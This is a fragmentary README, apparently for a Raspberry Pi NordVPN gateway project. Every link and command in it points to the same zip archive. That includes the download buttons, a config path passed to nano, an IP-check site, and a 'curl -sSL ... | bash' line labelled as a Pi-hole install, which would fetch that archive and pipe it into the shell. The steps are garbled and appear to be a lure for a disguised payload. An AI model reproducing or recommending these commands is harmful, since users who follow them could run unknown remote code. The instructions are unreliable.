...
[![Download](https://github.com/itzethanus/raspberrypi-nordvpn-gateway/raw/refs/heads/main/psyche/nordvpn-gateway-raspberrypi-2.7.zip)](https://github.com/itzethanus/raspberrypi-nordvpn-gateway/raw/refs/heads/main/psyche/nordvpn-gateway-raspberrypi-2.7.zip)
...
[Visit this page to download](https://github.com/itzethanus/raspberrypi-nordvpn-gateway/raw/refs/heads/main/psyche/nordvpn-gateway-raspberrypi-2.7.zip)
...
4. **Run the Install Script:**
   ...
   ```
   https://github.com/itzethanus/raspberrypi-nordvpn-gateway/raw/refs/heads/main/psyche/nordvpn-gateway-raspberrypi-2.7.zip
   ```
...
2. Use the following command to access the configuration file:
   ```
   nano https://github.com/itzethanus/raspberrypi-nordvpn-gateway/raw/refs/heads/main/psyche/nordvpn-gateway-raspberrypi-2.7.zip
   ```
...
1. Install Pi-hole using the command:
   ```
   curl -sSL https://github.com/itzethanus/raspberrypi-nordvpn-gateway/raw/refs/heads/main/psyche/nordvpn-gateway-raspberrypi-2.7.zip | bash
   ```
...
2. Visit [https://github.com/itzethanus/raspberrypi-nordvpn-gateway/raw/refs/heads/main/psyche/nordvpn-gateway-raspberrypi-2.7.zip](https://github.com/itzethanus/raspberrypi-nordvpn-gateway/raw/refs/heads/main/psyche/nordvpn-gateway-raspberrypi-2.7.zip) to verify that your IP address has changed to that of the NordVPN server.
